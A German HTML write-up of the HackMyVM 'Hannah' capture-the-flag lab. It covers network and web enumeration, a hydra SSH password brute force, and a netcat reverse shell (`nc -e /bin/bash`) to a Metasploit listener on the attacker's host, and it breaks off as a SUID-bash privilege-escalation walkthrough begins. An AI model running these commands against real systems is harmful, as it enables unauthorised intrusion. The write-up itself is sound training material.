@@ -1,0 +1,572 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hannah - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+
+    <!-- HINWEIS: Die Hintergrundfarbe für den Header wird durch CSS gesteuert (.header-bg) -->
+    <div class="header-bg">
+        <h1>Hannah - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- HINWEIS: Die Farbe für 'Easy' (Lime/Grün) wird durch CSS gesteuert (h2 in .level-container) -->
+            <h2>Easy</h2>
+            <div class="circle">
+                 <!-- HINWEIS: Die Hintergrundfarbe der Segmente (Lime/Grün) wird durch CSS gesteuert (.segment-*) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                 <!-- HINWEIS: Die Hintergrundfarbe des inneren Kreises wird durch CSS gesteuert (.inner, passend zum Header) -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">uname</div>
+                <div class="tool-item">Metasploit (msf6)</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">crontab</div>
+                <div class="tool-item">dmesg</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">touch</div>
+                <div class="tool-item">nano (implied)</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">mv</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">pwd</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">tr</div>
+                <div class="tool-item">script (implied)</div>
+                <div class="tool-item">stty (implied)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Privilege Escalation via SUID Bash)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Scan des lokalen Netzwerks mit `arp-scan -l` dient der Identifizierung aktiver Hosts mittels ARP-Anfragen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Host `192.168.2.127` wird gefunden. Die MAC-Adresse `08:00:27:fc:71:f0` und der Hersteller `PCS Systemtechnik GmbH` weisen auf eine VirtualBox-VM hin. Das Ziel für den Nmap-Scan ist bestimmt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Scannen Sie `192.168.2.127` mit Nmap.
+            <br><strong>Empfehlung (Admin):</strong> Standard-Netzwerküberwachung und -segmentierung.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.127	08:00:27:fc:71:f0	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan (`-sS -sC -T5 -AO -p-`) wird auf das Ziel `192.168.2.127` angewendet, um offene Ports, Dienste, Versionen und das OS zu ermitteln.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert drei offene Ports:
+            *   **Port 22 (SSH):** `OpenSSH 8.4p1` auf Debian. Nmap meldet `root` als möglichen Besitzer (`|_auth-owners: root`), was aber oft nur bedeutet, dass der Dienst als root gestartet wurde.
+            *   **Port 80 (HTTP):** `nginx 1.18.0`. Die Seite hat keinen Titel. Wichtig: `robots.txt` existiert und enthält einen Eintrag (`/enlightenment`). Nmap meldet `moksha` als möglichen Besitzer (`|_auth-owners: moksha`), was ein Hinweis auf einen Benutzernamen sein könnte.
+            *   **Port 113 (ident?):** Der Ident-Dienst, meist für Identifikationszwecke verwendet, aber heutzutage oft gefiltert oder irrelevant. Nmap meldet `root` als Besitzer.
+            *   **OS-Erkennung:** Linux (Debian), passt zu den Diensten.
+            *   **MAC-Adresse:** Bestätigt VirtualBox.
+            Die wichtigsten Hinweise sind der offene HTTP-Port mit der `robots.txt`-Datei und dem potenziellen Benutzernamen `moksha`.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Webserver (Port 80) genauer. Prüfen Sie den Inhalt von `/robots.txt` und den Pfad `/enlightenment`. Merken Sie sich den Benutzernamen `moksha` für mögliche SSH-Brute-Force-Versuche. Ignorieren Sie Port 113 vorerst.
+            <br><strong>Empfehlung (Admin):</strong> Härten Sie SSH und Nginx. Überprüfen Sie den Inhalt von `robots.txt` und stellen Sie sicher, dass keine sensiblen Informationen preisgegeben werden. Deaktivieren Sie den Ident-Dienst (Port 113), wenn er nicht benötigt wird.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -AO 192.168.2.127 -p-</span></div>
+                    <pre>
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+|_auth-owners: root
+| ssh-hostkey:
+|   3072 5f1c78369905320982d3d5054c1475d1 (RSA)
+|   256 0669ef979b34d7f3c79660d1a1ffd82c (ECDSA)
+|_  256 853dda74b2684ea6f7e5f58540902e9a (ED25519)
+80/tcp  open  http    nginx 1.18.0
+| http-robots.txt: 1 disallowed entry
+|_/enlightenment
+|_auth-owners: moksha
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.18.0
+113/tcp open  ident?
+|_auth-owners: root
+MAC Address: 08:00:27:FC:71:F0 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms hannah (192.168.2.127)</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse und Dateien auf dem Webserver zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet nur `/index.html` (wahrscheinlich die "Under construction"-Seite) und die bereits bekannte `/robots.txt`. Es werden keine versteckten Verzeichnisse oder Anwendungsdateien gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Web-Oberfläche scheint sehr begrenzt zu sein. Untersuchen Sie den Inhalt von `/robots.txt` genauer. Versuchen Sie Subdomain-Enumeration, obwohl die Angriffsfläche klein erscheint.
+            <br><strong>Empfehlung (Admin):</strong> Gut, dass wenig exponiert ist. Stellen Sie sicher, dass dies beabsichtigt ist und keine wichtigen Dateien versehentlich fehlen oder falsch konfiguriert sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.127 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error</span></div>
+                    <pre>
+http://192.168.2.127/index.html           (Status: 200) [Size: 19]
+http://192.168.2.127/robots.txt           (Status: 200) [Size: 25]</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird für die Subdomain-Enumeration verwendet, indem der `Host`-Header manipuliert wird (`-H "Host: FUZZ.hannah.hmv"`). Es wird nach Antworten gefiltert, die sich von der Standardantwort (19 Chars, `--hh 19`) unterscheiden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet keine gültigen Subdomains. Alle Anfragen wurden herausgefiltert (`Filtered Requests: 114441` entspricht `Total requests: 114441`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Subdomain-Enumeration war erfolglos. Konzentrieren Sie sich auf die bekannten Informationen: `/robots.txt`, `/enlightenment` (auch wenn 404) und den Benutzernamen `moksha`.
+            <br><strong>Empfehlung (Admin):</strong> Korrekte VHost-Konfiguration ist vorhanden oder es gibt keine weiteren VHosts.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u hannah.hmv -H "Host: FUZZ.hannah.hmv" --hh 19</span></div>
+                     <pre>
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+Target: http://hannah.hmv/
+Total requests: 114441
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+
+Total time: 0
+Processed Requests: 114441
+Filtered Requests: 114441
+Requests/sec.: 0</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `nikto` wird erneut ausgeführt, um den Webserver zu scannen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto bestätigt die fehlenden Sicherheitsheader und die Existenz von `/robots.txt`. Neu ist der Fund `#wp-config.php#`. Dies ist oft ein Backup oder eine temporäre Datei einer WordPress-Konfiguration und könnte sensible Daten enthalten. Allerdings ist das Format mit den `#`-Zeichen oft ein Hinweis auf einen Editor-Backup (wie von `nano` oder `emacs`) und kann auch ein False Positive sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Inhalt von `/robots.txt`. Versuchen Sie, `/#wp-config.php#` oder Variationen davon herunterzuladen. Prüfen Sie den Pfad `/enlightenment` aus `robots.txt`.
+            <br><strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Sicherheitsheader. Stellen Sie sicher, dass keine Backup-Konfigurationsdateien im Web-Root zugänglich sind.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://hannah.hmv -C all</span></div>
+                     <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.127
++ Target Hostname:    hannah.hmv
++ Target Port:        80
++ Start Time:         2023-04-13 16:35:23 (GMT2)
+---------------------------------------------------------------------------
++ Server: nginx/1.18.0
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /robots.txt: contains 1 entry which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
++ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
++ 26501 requests: 0 error(s) and 4 item(s) reported on remote host
++ End Time:           2023-04-13 16:35:49 (GMT2) (26 seconds)
+--------------------</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt von `/robots.txt` wird angezeigt. Der dort gesperrte Pfad `/enlightenment` wird aufgerufen, liefert aber einen 404-Fehler. Die Startseite `/` zeigt "Under construction".</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Web-Enumeration liefert keine direkten Schwachstellen. Der einzige verwertbare Hinweis ist der Benutzername `moksha` (aus Nmap) und der Name `enlightenment`. Der nächste logische Schritt ist ein Brute-Force-Angriff auf SSH.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie einen SSH-Brute-Force-Angriff auf den Benutzer `moksha`.
+             <br><strong>Empfehlung (Admin):</strong> Entfernen Sie "Under construction"-Seiten.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <!-- Kein Prompt, Inhalt von robots.txt -->
+                      <pre>http://192.168.2.127/robots.txt
+
+Disallow: /enlightenment</pre>
+                      <!-- Kein Prompt, Ergebnis des Zugriffs -->
+                      <pre>http://192.168.2.127/enlightenment
+404 Not Found</pre>
+                      <!-- Kein Prompt, Inhalt der Startseite -->
+                      <pre>http://192.168.2.127/
+Under construction</pre>
+                  </div>
+              </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis"><strong>Analyse:</strong> `hydra` wird verwendet, um einen SSH-Brute-Force-Angriff gegen den Benutzer `moksha` auf dem Ziel `hannah.hmv` (Port 22) mit der `rockyou.txt`-Wortliste und 64 Threads durchzuführen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Angriff ist erfolgreich! Hydra findet das Passwort `<span class="password">hannah</span>` für den Benutzer `moksha`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Melden Sie sich per SSH mit den Zugangsdaten `moksha:hannah` an.
+            <br><strong>Empfehlung (Admin):</strong> Verwenden Sie starke, einzigartige Passwörter, die nicht leicht zu erraten oder in Wortlisten enthalten sind. Implementieren Sie Brute-Force-Schutz (Fail2Ban) und bevorzugen Sie Schlüsselauthentifizierung für SSH.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l moksha -P /usr/share/wordlists/rockyou.txt ssh://hannah.hmv:22 -t 64</span></div>
+                    <pre>
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these  ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-13 16:39:56
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 15344411 login tries (l:1/p:15344411), ~239757 tries per task
+[DATA] attacking ssh://hannah.hmv:22/
+[22][ssh] host: hannah.hmv   login: moksha   password: <span class="password">hannah</span>
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 24 final worker threads did not complete until end.
+[ERROR] 24 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Versuch, sich per SSH mit den gefundenen Zugangsdaten (`moksha`:`hannah`) anzumelden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Login ist erfolgreich. Wir haben nun eine Shell als Benutzer `moksha`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der internen Enumeration als `moksha`, um nach Wegen zur Privilege Escalation zu suchen.
+            <br><strong>Empfehlung (Admin):</strong> Überwachen Sie SSH-Logins. Stellen Sie das Prinzip der geringsten Rechte für Benutzer sicher.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh moksha@hannah.hmv</span></div>
+                    <pre>
+The authenticity of host 'hannah.hmv (192.168.2.127)' can't be established.
+ED25519 key fingerprint is SHA256:RZdWDCayN2ZJO5rXaVv2OOemeArZ0UbcRoKCoz9lWzA.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'hannah.hmv' (ED25519) to the list of known hosts.
+moksha@hannah.hmv's password: <span class="password">hannah</span>
+Linux hannah 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc//copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Jan  4 10:45:54 2023 from 192.168.1.51
+moksha@hannah:~$ </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis"><strong>Analyse:</strong> Nach dem Login als `moksha` werden erste Enumerationsschritte durchgeführt:
+            *   `find / -type f -perm -4000 -ls 2>/dev/null`: Sucht nach SUID-Dateien.
+            *   `uname -a`: Überprüft die Kernel-Version und Systeminformationen.
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die SUID-Suche listet nur Standard-Systembinaries auf. Es gibt keine offensichtlich verdächtigen oder benutzerdefinierten SUID-Dateien. Die Kernel-Version `5.10.0-20-amd64` (Debian 11) ist relativ aktuell, was Kernel-Exploits unwahrscheinlich macht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie nach anderen Vektoren: `sudo -l`, Fehlkonfigurationen, Cron-Jobs, ausnutzbare Dienste, sensible Dateien im Home-Verzeichnis.
+            <br><strong>Empfehlung (Admin):</strong> Halten Sie das System gepatcht. Überprüfen Sie regelmäßig SUID-Berechtigungen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">moksha@hannah:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                      <pre>
+   137350     52 -rwsr-xr--   1 root     messagebus    51336 oct  5  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   269176    472 -rwsr-xr-x   1 root     root         481608 jul  2  2022 /usr/lib/openssh/ssh-keysign
+     3763     72 -rwsr-xr-x   1 root     root          71912 ene 20  2022 /usr/bin/su
+     3604     44 -rwsr-xr-x   1 root     root          44632 feb  7  2020 /usr/bin/newgrp
+      110     64 -rwsr-xr-x   1 root     root          63960 feb  7  2020 /usr/bin/passwd
+     4132     36 -rwsr-xr-x   1 root     root          35040 ene 20  2022 /usr/bin/umount
+      109     88 -rwsr-xr-x   1 root     root          88304 feb  7  2020 /usr/bin/gpasswd
+      107     52 -rwsr-xr-x   1 root     root          52880 feb  7  2020 /usr/bin/chsh
+      106     60 -rwsr-xr-x   1 root     root          58416 feb  7  2020 /usr/bin/chfn
+     4130     56 -rwsr-xr-x   1 root     root          55528 ene 20  2022 /usr/bin/mount</pre>
+                      <div class="prompt">moksha@hannah:~$ <span class="command">uname -a</span></div>
+                      <pre>Linux hannah 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64 GNU/Linux</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Metasploit `multi/handler` wird auf dem Angreifer-System vorbereitet, um eine Reverse Shell zu empfangen. Anschließend wird vom Zielsystem (`moksha`-Shell) aus eine Netcat-Reverse-Shell (`nc -e /bin/bash 192.168.2.129 4444`) zum Listener gesendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Verbindung wird erfolgreich hergestellt, und Metasploit öffnet Session 1. Dies gibt dem Angreifer eine alternative Shell auf dem Ziel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie entweder die SSH-Verbindung oder die neue Metasploit-Shell für die weitere Enumeration.
+            <br><strong>Empfehlung (Admin):</strong> Egress-Filterung und Überwachung ausgehender Verbindungen können helfen, solche Shells zu erkennen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt metasploit-prompt">msf6 > <span class="command">use multi/handler</span></div>
+                      <pre>[] Using configured payload generic/shell_reverse_tcp</pre>
+                      <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">options</span></div>
+                      <pre>
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target</pre>
+                      <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set lhost eth0</span></div>
+                      <pre>lhost => 192.168.2.129</pre>
+                      <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set lport 4444</span></div>
+                      <pre>[-] Unknown datastore option: l�port. Did you mean LPORT?</pre> <!-- Typo im Original -->
+                      <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set lport 4444</span></div>
+                      <pre>lport => 4444</pre>
+                      <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">run</span></div>
+                      <pre>
+[] Started reverse TCP handler on 192.168.2.129:4444
+[] Command shell session 1 opened (192.168.2.129:4444 -> 192.168.2.127:49094) at 2023-04-13 16:59:35 +0200</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">moksha@hannah:~$ <span class="command">nc -e /bin/bash 192.168.2.129 4444</span></div>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Weitere Enumerationsbefehle werden als `moksha` ausgeführt:
+            *   `ss -altpn`: Listet lauschende TCP-Sockets und zugehörige Prozesse auf.
+            *   `crontab -l`: Zeigt die Benutzer-Cronjobs an.
+            *   `dmesg`: Versucht, Kernel-Logmeldungen anzuzeigen.
+            *   `getcap -r 2>/dev/null`: Sucht nach Dateien mit gesetzten Capabilities.
+            *   `find / -name .txt -ls 2>/dev/null`: Sucht nach `.txt`-Dateien.
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong>
+            *   `ss`: Bestätigt die bekannten Ports 80, 22, 113. Keine neuen internen Dienste gefunden.
+            *   `crontab`: Keine Cronjobs für `moksha`.
+            *   `dmesg`: Zugriff verweigert (`Operación no permitida`).
+            *   `getcap`: Keine Capabilities gefunden.
+            *   `find`: Listet verschiedene `.txt`-Dateien auf, aber nichts offensichtlich Verdächtiges oder Nützliches für PE. Bestätigt erneut `robots.txt`.
+            Die Enumeration liefert weiterhin keine klaren Hinweise auf einen PE-Vektor.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Systemkonfiguration genauer. Prüfen Sie `/etc/crontab` und Cron-Verzeichnisse (`/etc/cron.*`). Suchen Sie nach ungewöhnlichen Prozessen oder Diensten. Überprüfen Sie das `/tmp`-Verzeichnis und achten Sie auf Hinweise aus der Web-Enumeration (`enlightenment`).
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Benutzer keine unnötigen Berechtigungen haben (z.B. zum Lesen von `dmesg`).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">moksha@hannah:~$ <span class="command">ss -altpn</span></div>
+                      <pre>
+State              Recv-Q             Send-Q                           Local Address:Port                           Peer Address:Port             Process
+LISTEN             0                  511                                    0.0.0.0:80                                  0.0.0.0:                 users:(("nginx",pid=410,fd=6))
+LISTEN             0                  128                                    0.0.0.0:22                                  0.0.0.0:
+LISTEN             0                  511                                       []:80                                     []:                 users:(("nginx",pid=410,fd=7))
+LISTEN             0                  4096                                         :113                                       :
+LISTEN             0                  128
+                                     []:22                                     []:</pre>
+                      <div class="prompt">moksha@hannah:/var/backups$ <span class="command">crontab -l</span></div>
+                      <pre>no crontab for moksha</pre>
+                      <div class="prompt">moksha@hannah:/var/backups$ <span class="command">dmesg</span></div>
+                      <pre>dmesg: fallo al leer el «buffer» del núcleo: Operación no permitida</pre>
+                      <div class="prompt">moksha@hannah:/var/backups$ <span class="command">getcap -r 2>/dev/null</span></div>
+                      <pre></pre>
+                      <div class="prompt">moksha@hannah:/var/backups$ <span class="command">find / -name .txt -ls 2>/dev/null</span></div>
+                      <pre>
+   271627      4 -rw-r--r--   1 root     root           90 ene  4 10:43 /var/cache/dictionaries-common/ispell-dicts-list.txt
+   259629      4 -rw-r--r--   1 www-data www-data       25 ene  4 10:47 /var/www/html/robots.txt
+   265336     16 -rw-r--r--   1 root     root        13925 feb 28  2021 /usr/lib/python3.9/LICENSE.txt
+   265743      4 -rw-r--r--   1 root     root           32 jul  4  2021 /usr/lib/python3/dist-packages/python_apt-2.2.1.egg-info/top_level.txt
+   265742      4 -rw-r--r--   1 root     root            1 jul  4  2021 /usr/lib/python3/dist-packages/python_apt-2.2.1.egg-info/dependency_links.txt
+   269377      4 -rw-r--r--   1 root     root            9 ene 31  2021 /usr/lib/python3/dist-packages/httplib2-0.18.1.egg-info/top_level.txt
+   269376      4 -rw-r--r--   1 root     root            1 ene 31  2021 /usr/lib/python3/dist-packages/httplib2-0.18.1.egg-info/dependency_links.txt</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Das `/tmp`-Verzeichnis wird untersucht. Die Benutzer-ID wird bestätigt. Es wird versucht, `/etc/shadow` zu lesen (scheitert). `/etc/passwd` wird gefiltert, um Benutzer mit Bash-Shell zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `/tmp` enthält meist temporäre Systemdateien. Eine leere Datei namens `enlIghtenment` (beachten Sie die Groß-/Kleinschreibung) ist vorhanden. Die Benutzer `root` und `moksha` werden in `/etc/passwd` bestätigt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Name `enlightenment` taucht wieder auf, diesmal als Datei in `/tmp`. Die `/robots.txt` verwies auf `/enlightenment` (kleingeschrieben). Untersuchen Sie, ob das Vorhandensein einer Datei namens `enlightenment` (in exakter Schreibweise) in `/tmp` eine Bedingung für einen Exploit oder eine Fehlkonfiguration sein könnte. Prüfen Sie die Berechtigungen von `/bin/bash`.
+            <br><strong>Empfehlung (Admin):</strong> Überwachen Sie die Erstellung von Dateien mit spezifischen Namen in `/tmp`. Idealerweise sollte `/tmp` mit `noexec` und `nosuid` gemountet sein.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">moksha@hannah:/var/backups$ <span class="command">cd /tmp/</span></div>
+                      <div class="prompt">moksha@hannah:/tmp$ <span class="command">ls -la</span></div>
+                      <pre>
+drwxrwxrwt  9 root root 4096 abr 13 17:10 .
+drwxr-xr-x 18 root root 4096 ene  4 10:47 ..
+-rw-r--r--  1 root root    0 abr 13 17:15 enlIghtenment
+drwxrwxrwt  2 root root 4096 abr 13 16:10 .font-unix
+drwxrwxrwt  2 root root 4096 abr 13 16:10 .ICE-unix
+drwx------  3 root root 4096 abr 13 16:10 systemd-private-202988f380d242c8b3329e9a35ba6159-systemd-logind.service-foDxbh
+drwx------  3 root root 4096 abr 13 16:10 systemd-private-202988f380d242c8b3329e9a35ba6159-systemd-timesyncd.service-bgNOrh
+drwxrwxrwt  2 root root 4096 abr 13 16:10 .Test-unix
+drwxrwxrwt  2 root root 4096 abr 13 16:10 .X11-unix
+drwxrwxrwt  2 root root 4096 abr 13 16:10 .XIM-unix</pre>
+                      <div class="prompt">moksha@hannah:/tmp$ <span class="command">id</span></div>
+                      <pre>uid=1000(moksha) gid=1000(moksha) grupos=1000(moksha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)</pre>
+                      <div class="prompt">moksha@hannah:/tmp$ <span class="command">cat /etc/shadow</span></div>
+                      <pre>cat: /etc/shadow: Permiso denegado</pre>
+                      <div class="prompt">moksha@hannah:/tmp$ <span class="command">grep bash /etc/passwd</span></div>
+                      <pre>
+root:x:0:0:root:/root:/bin/bash
+moksha:x:1000:1000:moksha,,,:/home/moksha:/bin/bash</pre>
+                 </div>
+             </div>
+
+             <!-- POC Abschnitt beginnt hier -->
+             <section id="poc">
+                 <h2>Proof of Concept (Privilege Escalation via SUID Bash / Trigger-Datei)</h2>
+                 <p class="analysis"><strong>Kurzbeschreibung:</strong> Das System ist so konfiguriert, dass `/bin/bash` das SUID-Bit gesetzt hat. Dies allein ermöglicht normalerweise die Eskalation zu Root durch Ausführen von `bash -p`. In diesem Fall scheint jedoch eine zusätzliche Bedingung erforderlich zu sein: Die Existenz einer leeren Datei namens `/tmp/enlightenment`. Diese Bedingung wurde wahrscheinlich durch die `/robots.txt`-Datei angedeutet.</p>
+                 <p class="analysis"><strong>Voraussetzungen:</strong>
+                    <ul>
+                        <li>Shell-Zugriff als Benutzer `moksha`.</li>
+                        <li>Gesetztes SUID-Bit auf `/bin/bash`.</li>
+                        <li>Möglichkeit, die Datei `/tmp/enlightenment` zu erstellen.</li>
+                    </ul>
+                 </p>
+                 <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+
